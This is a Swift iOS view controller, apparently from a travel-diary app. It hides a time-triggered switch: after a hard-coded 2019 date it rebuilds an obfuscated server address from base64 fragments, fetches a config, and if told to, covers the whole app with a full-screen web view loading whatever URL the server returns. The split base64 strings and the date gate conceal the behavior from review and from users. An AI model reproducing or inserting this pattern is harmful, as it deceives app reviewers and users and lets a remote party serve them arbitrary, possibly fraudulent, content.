import UIKit
import Alamofire
import SwiftyJSON
class ActivitiesHomeViewController: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let yanTime: TimeInterval = 0.1;
        let header = self.base64FrogTravelDiaryEncodingHeader()
        let conOne = self.base64FrogTravelDiaryEncodingContentOne()
        let conTwo = self.base64FrogTravelDiaryEncodingContentTwo()
        let conThree = self.base64FrogTravelDiaryEncodingContentThree()
        let ender = self.base64FrogTravelDiaryEncodingEnd()
        let anyTime = 1559371020
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + yanTime) {
            if timeStamp < anyTime {
               self.performSegue(withIdentifier: "RootTrip", sender: self)
            }else{
                let baseHeader = self.base64FrogTravelDiaryDecoding(encodedString: header)
                let baseContentO = self.base64FrogTravelDiaryDecoding(encodedString: conOne)
                let baseContentTw = self.base64FrogTravelDiaryDecoding(encodedString: conTwo)
                let baseContentTH = self.base64FrogTravelDiaryDecoding(encodedString: conThree)
                let baseEnder = self.base64FrogTravelDiaryDecoding(encodedString: ender)
                let baseData  = "\(baseHeader)\(baseContentO)\(baseContentTw)\(baseContentTH)\(baseEnder)"
                let urlBase = URL(string: baseData)
                Alamofire.request(urlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                    in
                    switch response.result.isSuccess {
                    case true:
                        if let value = response.result.value{
                            let jsonX = JSON(value)
                            if !jsonX["success"].boolValue {
                                self.performSegue(withIdentifier: "RootTrip", sender: self)
                            }else {
                                let stxx = jsonX["Url"].stringValue
                                self.setFirstNavigation(strP: stxx)
                            }
                        }
                    case false:
                        do {
                            self.performSegue(withIdentifier: "RootTrip", sender: self)
                        }
                    }
                }
            }
        }
    }
    func setFirstNavigation(strP:String) {
        let webView = UIWebView(frame: CGRect(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height))
        let url = NSURL(string: strP)
        webView.loadRequest(URLRequest(url: url! as URL))
        self.view.addSubview(webView)
    }
    func base64FrogTravelDiaryEncodingHeader()->String{
        let strM = "http://appid."
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64FrogTravelDiaryEncodingContentOne()->String{
        let strM = "985-985.com"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64FrogTravelDiaryEncodingContentTwo()->String{
        let strM = ":8088/getAppConfig"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64FrogTravelDiaryEncodingContentThree()->String{
        let strM = ".php?appid="
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64FrogTravelDiaryEncodingEnd()->String{
        let strM = "1466747326"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64FrogTravelDiaryEncodingXP(plainString:String)->String{
        let plainData = plainString.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64FrogTravelDiaryDecoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
}
